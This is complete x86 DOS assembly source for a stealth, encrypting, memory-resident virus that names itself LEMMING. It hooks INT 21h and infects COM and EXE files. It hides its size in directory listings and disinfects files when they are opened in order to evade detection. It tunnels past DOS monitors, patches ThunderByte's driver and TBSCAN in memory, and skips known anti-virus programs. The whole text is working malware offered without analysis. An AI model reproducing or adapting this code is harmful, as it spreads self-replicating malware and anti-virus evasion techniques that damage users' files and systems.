.286
.model tiny
.code

virus_size        equ     vir_end - start
virus_siz         equ     virus_size + virus_size
decrypt_size      equ     handle - next_function
data_size         equ     vir_end - step1
engine_size       equ     next_function - start
Int21_base        equ     021h*4
timer_seg         equ     01ch*4+2
virus_paragraphs  equ     virus_size * 2/16

code    segment
        assume cs:code,ds:code,es:code


progr   equ     0100h
        org     progr

main:
start:
        mov     cx,decrypt_size
        lea     si,next_function
        call    ofset
ofset:  pop     bp
        sub     bp,109h                         ;Set postion of base pointer
decrypt:
        xor     byte ptr cs:[si][bp],00         ;Anti heuristic decryptor
key:                                            ;will fool Thunderbyte.
        jcxz    next_function
        dec     cx
        inc     si
        jmp     decrypt

fooled_tbav:


next_function:
        push   es
        push   ds
        push   cs
        pop    ds
        call   getcpu                           ;Detect CPU
        je     _8086
        mov    ax,0fffeh                        ;Determine if installed
        int    21h
        cmp    bx,0ffffh                        ;Returns ffff in bx if so...

test_processor: 
        jne      install__
_8086:  jmp     end_install                     ;Not 80286 compatible

transfer:
        call    get_int21
        mov     di,0100h
        push    cs
        pop     ds
        lea     si,word ptr cs:start[bp]
        mov     cx,virus_size
move:
        rep     movsb                           ;Move virus and make resident

copied:

        call    set_int21                       ;Set int 21 to virus
        jmp     end_install

install__ proc near
        push    ds es
        call    anti_av                         ;Detect the presence of TBDRIVER
        pop     es ds                           ;and patch
        mov     ax,5802h                        ;are umb's available?
        int     21h
        jc      install_low                     ;no then install in low memory
        mov     ax,5803h                        ;Chain  mcb's into low memory
        mov     bx,1
        int     21h
        jc      install_low
        push    es                              ;get current mcb
        pop     dx
        dec     dx
        mov     di,3                            ;add to current mcb to get
                                                ;pointer to next mcb
walk:   mov     es,dx
        cmp     byte ptr es:[di-3],05ah
        je      lastmcb
        add     dx,word ptr es:di
        inc     dx                              ;search for last mcb.
        mov     es,dx
        cmp     byte ptr es:[di-3],05ah
        jne     walk
lastmcb:
        mov     ax,5803h                        ;remove umb link
        xor     bx,bx
        int     21h
        cmp     word ptr es:[di],virus_paragraphs
        ja      hi_install                      ;Enough memory for UMB install?
        push    cs
        pop     es
        jmp     install_low
hi_install:
        inc     dx
        mov     es,dx                           ;es points to virus new CS
install_low:
        push    es
        xor     di,di
        push    es                              ;original psp segment
        pop     dx
        dec     dx
        mov     es,dx
        cmp     byte ptr es:[di],5ah
        jne     end_install
        mov     ax,virus_siz
        mov     cl,4
        shr     ax,cl
        inc     ax
        inc     ax
        sub     word ptr es:[di+3],ax   ;
        mov     ax,word ptr es:[di+3]           ;copy last mcb size into ax
        pop     cx
        add     cx,ax                           ;new segment
        sub     cx,10h
        mov     word ptr cs:new_seg[bp],cx
        mov     es,cx
        jmp     transfer                        ;go and move virus to new
                                                ;memory position
install__ endp

end_install:    
        pop     ds
        pop     es
        lea     di,word ptr cs:buffer1[bp]
        mov     ax,05a4dh
        cmp     word ptr cs:[di],ax
        jne     goto_com
        mov     ax,word ptr cs:[di+16h]
        push    es
        pop     bx

        add     bx,10h
        add     ax,bx                           ;code segment

        mov     cx,word ptr cs:[di+0eh]         ;get original ss
        mov     dx,word ptr cs:[di+10h]         ;get original sp
        add     cx,bx
        cli
        mov     ss,cx                           ;restore original ss and sp
        mov     sp,dx
        sti
        push    ax
        mov     bx,word ptr cs:[di+14h]         ;get original ip
        push    bx
        call    clear_reg                       ;clear all registers
        retf                                    ;and hand back control

goto_com:
        cld
        lea     si,buffer1[bp]                  ;restore com entry point
        mov     di,0100h
        mov     cx,18h
        rep     movsb
        push    0100h
        call    clear_reg
        ret                                     ;hand back control

clear_reg:
        xor     ax,ax
        xor     bx,bx
        xor     cx,cx
        xor     dx,dx
        xor     si,si
        xor     di,di
        xor     bp,bp
        ret

anti_av proc    near
;                       DISABLE TBDRIVER AGAINST TUNNELING DETECT        

        mov     ax,5200h
        int     21h                             ;es:bx
        add     bx,22h                          ;pointer to first device 'NUL'
                                                ;or 'CON'
next_search:
        cld
        lds     si,word ptr es:bx
        cmp     si,-1
        je      not_found
        push    ds cs
        pop     es
        lea     di,scan[bp]
        push    si
        add     si,10                           ;device name offset
                                                ;from bx pointer
        mov     cx,5
        rep     cmpsb                           ;search for device name
        pop     bx es
        jne     next_search
found:                                          ;If TBDRIVER is found then
        push    ds                              ;patch against tunneling
        pop     es
        push    cs
        pop     ds
        mov     di,bx
        xor     ax,ax
        lea     si,scan_string[bp]
next_char:
        inc     ax
        mov     cx,5
        push    si
        rep     cmpsb                           ;search for string
        pop     si
        je      bullseye
        cmp     ax,10116
        je      not_found
        jmp     next_char

bullseye:
        mov   es:[di-12],09090h                 ;disable tbdriver
not_found:
        ret
        scan            db      'TBDRV'
        scan_string    db      0fah,09ch,0fch,053h,050h
anti_av endp


VirName   db  0dh,0ah,'The Rise and Fall of ThunderByte-1994-Australia.',0dh,0ah
          db  ' You Will Never Trust Anti-Virus Software Again!! ',0dh,0ah
          db  '[LEMMING] ver .99á'

Anti_tbscan     proc    near

        push    es ds si di ax bx cx dx
        push    bx
        lea     si,Tbscan
        lea     bx,tbscan_size
        mov     byte ptr cs:no_scasb_flag,0
        call    tbscan_test                     ;Is Tbscan being executed?
        pop     bx
        jnc     not_tbscan
        push    cs
        pop     ds
        call    hook_int1c                      ;
        les     di, dword ptr es:bx+2
        push    di
        xor     bx,bx
        mov     bl, byte ptr es:[di]
        add     di,bx                           ;di now points to end of C/T
        lea     si,tbscan_switch
        cld
        movsw
        movsw
        pop     di
        add     byte ptr es:[di],3
not_tbscan:
        pop     dx cx bx ax di si ds es
        ret
tbscan_size     db      0,6,6,0
tbscan_switch   db      20h,'c','o',0dh         ;adding ' co' to command line
                                                ;forces tbscan into Compat
                                                ;mode
Anti_tbscan     endp
   
get_int21       proc    near
        push    es
        push    ds
        xor     bx,bx
        mov     ds,bx
        mov     bx,word ptr ds:[84h]
        mov     es,word ptr ds:[86h]
        pop     ds
        mov     word ptr cs:int_21_off[bp],bx   ;save vector for later calls
        mov     word ptr cs:int_21_seg[bp], es
        mov     word ptr cs:int_21_off_o[bp],bx
        mov     word ptr cs:int_21_seg_o[bp],es
        call    int_trace
        pop     es
        ret
get_int21       endp

set_int21       proc    near
        push    es

        xor     ax,ax
        mov     ds,ax
        lea     ax,word ptr cs:int_21
        mov     bx,word ptr cs:new_seg[bp]
        cli
        mov     ds:[134],bx
        mov     ds:[132],ax
        sti
        pop     es
        ret
set_int21       endp

identify  proc    near

        ;on entry, ds:dx points to asciiz file to be run.
        ;bx must point to file size table. EOT must be '0'
        ;si must point to table of strings to compare.
        ;direction_flag==0 for before '. e.g lemming.com' and 1 for after.

        push    ds                              ;pointers to asciiz
        push    dx
        mov     cx,00ffh
        mov     al,'.'
        push    ds
        pop     es
        push    dx
        pop     di
        cmp     byte ptr cs:no_scasb_flag,1
        je      no_scasb
        cld
        repne   scasb
no_scasb:
        xor     ax,ax                           ;load index position (0).
        xor     cx,cx
        push    cs
        pop     ds
next_byte:
        inc     al
        push    ax
        push    di                              ;save position
        push    si
        xlat
        or      al,al                           ;end of index?
        jz      no_match                        ;yes?
        cmp     byte ptr cs:direction_flag,1
        je      right
        sub     di,8                            ;back up to begining of name
        cmp     byte ptr cs:no_scasb_flag,1
        je      right
        add     di,8
        sub     di,ax
        dec     di
right:  mov     cl,al                           ;bytes to count...
        rep     cmpsb
        je      match_found
        pop     si
        add     si,ax                           ;if not equal, next field
        pop     di
        pop     ax
        jmp     next_byte

match_found:
        clc
        jmp     clear

no_match: stc

clear:  pop     ax
        pop     ax
        pop     ax
        pop     dx
        pop     ds
        ret

        direction_flag  db      0
        no_scasb_flag   db      0
identify  endp


do_not_infect   proc    near                    ;Table of files not to infect
start_:
        AVSize  db      4,4,6,3,5,5,0
        AVName :db      'TBAV'
        TBSCAN: db      'TBSCAN'
                db      'NAV'
                db      'VSAFE'
                db      'FPROT'

do_not_infect   endp
is_file_infectable proc near

extension_size  db  4,3,3,3,3,0                 ;Table of extensions to infect
extension:      db  'COM'
                db  'com'
                db  'EXE'
                db  'exe'
stop_:
is_file_infectable endp

stealth_a proc  near                            ;Appears to be the same DIR
        pushf                                   ;stealth routines from NPOX
        push    cs
        call    skip_infect
        test    al,al
        jnz     no

        push    ax
        push    bx
        push    es
        mov     ah,51h
        int     21h

        mov     es,bx
        cmp     bx,es:[16h]
        jnz     not_
        mov     bx,dx
        mov     al,[bx]
        push    ax
        mov     ah,2fh
        int     21h
        pop     ax
        inc     al

        jnz     fcb_ok
        add     bx,7h
fcb_ok: mov     ax,es:[bx+17h]

        and     ax,01eh
        xor     al,01eh
        jnz     not_
        and     byte ptr es:[bx+17h],0e0h
        sub     word ptr es:[bx+1dh],virus_size
        sbb     word ptr es:[bx+1fh],0
not_:   pop     es
        pop     bx
        pop     ax
no:     iret
stealth_a endp

search_flag_b:
        mov     byte ptr cs:trace_flag,0        ;re-use to save memory
        jmp     dta_out

stealth_b proc near
        pushf
        push    cs
        call    skip_infect
        jc      search_flag_b
        mov     byte ptr cs:trace_flag,1
        push    ax
        push    bx
        push    es
        mov     ah,2fh
        int     21h

        mov     ax,es:[bx+16h]
        mov     cx,es:[bx+18h]
        and     ax,1eh
        xor     ax,1eh
        jnz     dta_out1
        sub     word ptr es:[bx+1ah],virus_size
        sbb     word ptr es:[bx+1ch],0

dta_out1: pop     es
        pop     bx
        pop     ax
dta_out: retf    0002h

stealth_b endp
stealth: jmp stealth_a

critical_error_handler:
        mov     al,03h
        iret

int_21  proc    near
        cmp     ah,011h
        je      stealth
        cmp     ah,012h
        je      stealth
        cmp     ah,04eh
        je      stealth_b
        cmp     ah,04fh
        je      stealth_b
        cmp     ah,04bh
        je      file_infect_step
        cmp     ah,06ch
        je      disinfect_step
        cmp     ah,03dh
        je      disinfect_step
        cmp     ah,03eh
        je      file_infect
        cmp     ah,04ch
        je      program_terminate_step
        cmp     ax,0fffeh                       ;test if active in memory
        jne     direct
        mov     bx,0ffffh
        iret

        direct: jmp     dword ptr cs:int_21_off

program_terminate_step:
        call    program_terminate
        jmp     direct

disinfect_step: jmp     disinfect

file_infect_step:
        call    anti_tbscan
        jmp     file_infect
int_21          endp



get_filename_from_handle  proc    near

        push    bx
        mov     ax,1220h
        int     2fh
        mov     ax,1216h
        mov     bl,es:[di]
        int     2fh
        pop     bx
        add     di,11h
        mov     byte ptr es:[di-0fh],02
        add     di,17h
        push    di
        pop     dx
        push    es
        pop     ds
        ret
get_filename_from_handle  endp

infect_OK  proc near

        lea     bx,extension_size
        lea     si,extension                    ;Test for EXE,COM,OVL
        mov     byte ptr cs:direction_flag,1
        call    identify
        jc      error                           ;if not exe then error

        lea     bx,avsize
        lea     si,avname                       ;Test for AV
tbscan_test:
        mov     byte ptr cs:direction_flag,0
        call    identify
        jnc     error                           ;If no AV then good!

no_error:
        clc
        ret

error:  stc
        ret

infect_ok  endp

no_good:
        jmp     exe

file_infect     proc
        cmp     bl,4
        ja      handle_ok
        cmp     ah,4bh                          ;determine if file open or
        je      handle_ok                       ;file execute
        jmp     skip_infect
handle_ok:
        push    ax
        push    bx
        push    es
        push    bx
        push    cx
        push    dx
        push    ds
        push    di
        push    si

        call    set_critical_error_handler
        cmp     ah,4bh
        jne     only_handle_supplied

        call    open_file                       ;open file if call = ah=4b
        jc      no_good
        cmp     bl,5
        jb      no_good
        mov     byte ptr cs:execute_flag,1

        push    bx
        mov     byte ptr cs:no_scasb_flag,0
        call    infect_ok
        pop     bx
        jnc     skip_flag_check
        jmp     dont_infect_here

only_handle_supplied:

        mov     byte ptr cs:execute_flag,0      ;if flag ==1 then close
        call    get_filename_from_handle


        push    bx
        mov     byte ptr cs:no_scasb_flag,1
        call    infect_ok
        pop     bx

        jnc     good
        jmp     dont_infect_here

skip_flag_check:

good:   call    get_date
        push    dx
        push    cx
        mov     word ptr cs:old_date,dx
        mov     word ptr cs:old_time,cx
        call    is_file_infected
        jc      do_it
        jmp     loc_15

do_it:  call    set_offset_start
        push    cs
        pop     ds
        lea     dx,buffer
        mov     cx,18h
        call    read_file
        push    cx

        cld
        push    cs
        pop     es
        lea     si,buffer
        lea     di,buffer1
        mov     cx,18h
        rep     movsb                           ;Save header for stealth
        pop     cx                              ;disinfect on open
        cmp    word ptr cs:[buffer1+0ch],1      ;Dont infect if number of
        jb     exe                              ;paragraps required after load
        xor     dx,dx                           ;is less than 1
        call    set_offset_e
        cmp     dx,0
        ja      big_enough
        cmp     ax,0fff0h-virus_siz
        ja      exe

big_enough:
        cmp     dx,4
        ja      exe
        cmp     byte ptr ds:[buffer],4Dh        ; 'M'  ; is file exe?
        je      file_is_exe                     ; Jump if equal;
        jmp      file_is_com
exe:
        jmp     loc_15

file_is_exe:                                    ;Recalculate new EXE Header
        push    bx
        mov     cl,4
        mov     bx,word ptr [buffer+8]
        shl     bx,cl
        push    dx ax
        sub     ax,bx
        sbb     dx,0
        mov     bx,10h
        div     bx
        mov     word ptr [buffer+14h],dx
        mov     word ptr [buffer+16h],ax
        add     ax,virus_size/16
        mov     word ptr [buffer+0eh],ax
        pop     ax dx
        add     ax,virus_size
        adc     dx,0
        mov     bx,512
        div     bx
        pop     bx
        inc     ax
        mov     word ptr [buffer+4],ax
        mov     word ptr [buffer+2],dx
        mov     cx,18h
        lea     dx,buffer
        push    dx
        push    cx
        jmp     short loc_14

File_Is_Com:
        sub     ax,3
        mov     word ptr cs:[com_header_offset],ax
        mov     cx,3                            ;header size in bytes
        lea     dx,com_header
        push    dx
        push    cx
loc_14:

        call    write_virus                     ;write and encrypt virus
        call    set_offset_start
        pop     cx
        pop     dx
        call    write_bytes
        pop     cx
        or      cl,01eh
        push    cx

loc_15:
        pop     cx
        pop     dx
        call    write_date

dont_infect_here:
        cmp     byte ptr cs:execute_flag,1
        jne     dont_close
        mov     ah,3eh
        call    dos
dont_close:
        call    restore_critical_error_handler
        pop     si
        pop     di
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     es
        pop     bx
        pop     ax

skip_infect:
        jmp     dword ptr cs:int_21_off

execute_flag db      0

file_infect  endp

disinfect     proc    near
        pusha
        push    ds es
        cmp     ah,06ch                         ;adjust ds:si to ds:dx if
        jne     not_extended                    ;ah == extended file open(6c)
        push    si
        pop     dx
not_extended:
        mov     byte ptr cs:no_scasb_flag,0
        call    infect_ok
        jc      skip_disinfect
        call    set_critical_error_handler
        call    open_file
        jc      skip_disinfect                  ;Skip disinfection on error
        push    cs
        pop     ds

        call    get_date                        ;Get file date
        call    is_file_infected                ;Is the seconds field 60?
        jne     dont_disinfect                  ;If not, then quit
        xor     dx,dx
        call    set_offset_e                    ;get infected file size
        push    dx                              ;save
        push    ax
        sub     ax,1ch                          ;sub buffer size from end
        sbb     dx,0
        mov     cx,dx                           ;set new pointer to buffer
        mov     dx,ax
        call    no_xor
        lea     dx,old_date
        mov     cx,1ch                          ;buffer = 18h + 4 for date = 1c
        call    read_file                       ;read into buffer
        call    set_offset_start                ;Restore original header
        mov     cx,18h
        lea     dx,buffer1
        call    write_bytes                     ;write at start
        pop     dx
        pop     cx
        sub     dx,virus_size
        sbb     cx,0
        call    no_xor                          ;set offset from start
        mov     ah,40h
        xor     cx,cx
        call    dos                             ;truncate
        mov     cx,old_time
        mov     dx,old_date
        call    write_date                      ;Restore original date and time
        cmp     trace_flag,0
        je      dont_disinfect
        call    reset_dta                       ;Adjust seconds field in DTA
dont_disinfect:
        mov     ah,3eh                          ;Close file
        call    dos
        call    restore_critical_error_handler
skip_disinfect:        
        pop     es ds
        popa
        jmp     dword ptr cs:int_21_off

disinfect       endp

reset_dta proc    near
        push    ax bx es
        mov     ah,2fh                          ;Get current DTA
        call    dos                             ;DTA pointed to by es:bx
        mov     ax,word ptr cs:old_time         ;Get old time and
        mov     word ptr es:[bx+16h],ax         ;save in DTA
        pop     es bx ax
        ret
reset_dta endp

get_date proc    near
        mov     ax,5700h
        call    dos
        ret
get_date        endp

write_date      proc    near
        mov     ax,5701h
        call    dos
        ret
write_date      endp

is_file_infected proc   near
        and     cl,01eh                         ;Unmask seconds
        cmp     cl,01eh
        ret
is_file_infected endp

com_header      proc
                  db      0e9h                    ;JMP
com_header_offset dw    0000
com_header      endp


set_offset_start    proc
        xor     cx,cx
        xor     dx,dx
no_xor: mov     ax,4200h
        call    dos
        ret

set_offset_e:
        xor     cx,cx
        mov     ax,4202h
        call    dos
        ret
read_file:
        mov     ah,3fh
        call    dos
        ret
write_bytes:
        mov     ah,40h
        call    dos
        ret

write_virus:
        xor     ax,ax
        out     70h,al
        in      ax,70h                          ;Get seconds from computer
        cmp     ah,0                            ;If seconds = 0 then
        jne     dont_mask                       ;set to 12
        mov     ah,12

dont_mask:
        cmp     ah,21h                          ;???
        jne     dont_mask1
        mov     ah,15h

dont_mask1:
        mov     byte ptr cs:key-1,ah            ;Save key in virus decryptor
        lea     si,start                        ;move to preallocated memory for
        lea     di,vir_end                      ;encryption
        inc     di
        mov     cx,virus_size
        cld
        rep     movsb                           ;Copy uninfected verson to
                                                ;encryption area
        mov     cx,decrypt_size
        lea     si,vir_end                      ;load si with virus and address
        inc     si                              ;inc to virus image to encrypt
        add     si,engine_size                  ;add 16h bytes so as not to
encrypt:                                        ;encrypt virus engine
        xor     [si],ah
        inc     si
        loop    encrypt                         ;Encrypt

        mov     ah,40h
        mov     cx,virus_size
        lea     dx,vir_end
        inc     dx
        call    dos
        ret
set_offset_start    endp

dos     proc    near
        Pushf                                   ;Save flags for DOS IRET
        call    dword ptr cs:int_21_off_o       ;original dos entry
        ret
dos     endp

open_file       proc    near
        push    ax
        mov     ax,3d02h
        call    dos
        push    ax
        pop     bx ax                           ;Put handle into BX
        ret
open_file       endp

set_critical_error_handler      proc    near
        push    ax bx dx es ds
        push    cs
        pop     ds
        mov     ax,3524h
        call    dos
        mov     critical_error_seg,es
        mov     critical_error_off,bx
        lea     dx,critical_error_handler
        mov     ax,2524h
        call    dos
        pop     ds es dx bx ax
        ret
set_critical_error_handler      endp

critical_error_off      dw      ?
critical_error_seg      dw      ?

restore_critical_error_handler  proc    near
        mov     ax,2524h
        lds     dx,dword ptr cs:critical_error_off
        call    dos
        ret
restore_critical_error_handler  endp


int_trace       proc    near
        mov     ax,3501h                        ;get trace interrupt
        int     21h
        mov     di,es                           ;save seg and offset in di, si
        mov     si,bx

        mov     ax,2501h
        lea     dx,word ptr cs:int_01[bp]       ;point  trace to our segment
        int     21h
        pushf
        push    cs
        lea     ax,word ptr cs:exit_trace[bp]   ;set up for after trace
        push    ax

        cli
        pushf
        pop     ax
        or      ax,100h                         ;switch trace flag on
        push    ax                              ;save   flags

        mov     ax,word ptr cs:int_21_seg[bp]
        push    ax                              ;save   seg
        mov     ax,word ptr cs:int_21_off[bp]
        push    ax                              ;save   offset
        mov     ax,351ch                        ;get INT 1c address
        mov     byte ptr cs:trace_flag[bp],1
        mov     bx,bp
        iret
exit_trace:     
        mov     byte ptr cs:trace_flag[bp],0    ;turn of our trace flag
        sti                                     ;restore interrupts
        mov     ax,2501h                        ;restore original INT 01
        mov     dx,si                           ;Vectors
        mov     ds,di
        int     21h
        ret                                     ;Done
int_01:
        push    bp
        mov     bx,bp
        mov     bp,sp
        cmp     byte ptr cs:trace_flag[bx],1
        je      tunnel_dos
tunnel:
        and     word ptr [bp+6],0feffh
        mov     byte ptr cs:trace_flag[bx],0
        pop     bp
        iret
tunnel_dos:
        cmp     word ptr [bp+4],300h                 ;Are we in the DOS SEG?
        jb      save_vector
        pop     bp
        iret

save_vector:
        push    cx
        mov     cx,[bp+2]
        mov     cs:int_21_off_o[bx],cx               ;Delta offsets are used
        mov     cx,[bp+4]
        mov     cs:int_21_seg_o[bx],cx
        pop     cx
        jmp     tunnel

int_trace       endp

program_terminate   proc   near
        cmp     byte ptr cs:tbexecute_flag,0
        je      tbscan_exit
        mov     byte ptr cs:tbexecute_flag,0          ;Turn off tbscan execute
        mov     byte ptr cs:done_flag,0               ;flag
        call    unhook_1c                             ;Restore int 1C
tbscan_exit:
        ret
program_terminate   endp

hook_int1c      proc    near
        pusha
        push    es ds
        mov     ax,0351ch
        call    dos
        mov     int_1c_off,bx
        mov     bx,es
        mov     int_1c_seg,bx
        lea     dx,int1c
        mov     ah,025h
        call    dos
        mov     tbexecute_flag,1
        pop     ds es
        popa
        ret
hook_int1c      endp

int1c   proc    near
        cmp     byte ptr cs:done_flag,1
        je      exit_1c
        cmp     byte ptr cs:tbexecute_flag,1
        jne     exit_1c
        call    convert_tbscan                  ;Patch TBSCAN with 'OWN'
exit_1c:
        jmp     dword ptr cs:int_1c_off
int1c   endp

unhook_1c  proc near
        pusha
        push    es ds cs
        pop     ax                              ;ax= code seg
        xor     bx,bx
        mov     es,bx                           ;es= 0000h
        push    es
        mov     bx,word ptr es:timer_seg
        mov     es,bx
        cmp     bx,ax
        jne     dont_unhook
        mov     ax,word ptr cs:int_1c_seg
        mov     bx,word ptr cs:int_1c_off
        pop     es
        cli
        mov     word ptr es:timer_seg,ax
        mov     word ptr es:timer_seg-2,bx
        sti
dont_unhook:
        pop     ds es
        popa
        ret
unhook_1c          endp

convert_tbscan  proc    near
        pusha
        push    es ds cs
        pop     ax
        xor     bx,bx
        mov     es,bx
        mov     bx,word ptr es:timer_seg        ;Trace through INT 1c which is
        mov     di,word ptr es:timer_seg-2      ;hooked by TBSCAN
        mov     es,bx
        cmp     bx,ax
        je      exit_convert
        xor     ax,ax
        lea     si,replace
        push    cs
        pop     ds
next_char2:
        inc     ax
        mov     cx,8
        push    si
        rep     cmpsb                            ;search for string 'DOS','OWN'
        pop     si                               ;within TBSCAN while it is in
        je      found_dos                        ;memory doing it's thing.
        cmp     ax,0fffeh
        je      exit_convert
        jmp     next_char2

found_DOS:
        push    es
        pop     ds
        sub     di,8
        mov     si,di
        add     si,4
        mov     cx,3
        rep     movsb
        mov     byte ptr cs:done_flag,1
exit_convert:
        pop     ds es
        popa
        ret

        ;       Search Data
replace         db      'DOS',0,'OWN',0
done_flag       db      0
convert_tbscan  endp

Getcpu  proc    near                             ;Test CPU Type
        Pushf                
        Pop  AX 
        Push AX
        And  AX,0FFFh
        Push AX
        Popf
        Pushf
        Pop  AX 
        pop  BX
        And  AX,0F000h
        Cmp  AX,0F000h
        ret
getcpu  endp


HANDLE:

step1:
data    proc    near
        db      '=!Packed file is corruptœ'
        buffer          db      17h dup(?)       ;Modified EXE and Com header
                        db      90h
        tbexecute_flag  db      0
        trace_flag      db      ?                ;Used for tunneling
        int_01_off      dw      ?
        int_01_seg      dw      ?
        int_1c_off      dw      ?
        int_1c_seg      dw      ?
        int_21_off_o    dw      ?                ;Original INT 21
        int_21_seg_o    dw      ?
        int_21_off      dw      ?                ;Chained INT 21
        int_21_seg      dw      ?
        new_seg         dw      ?
        old_date        dw      ?
        old_time        dw      ?
        buffer1 db      90h                      ;Original file header for
        mov     ax,4c00h                         ;Com and Exe files
        int     21h
        db      11h dup(?)
        db      90h

data    endp

vir_end:
code    ends
        end main
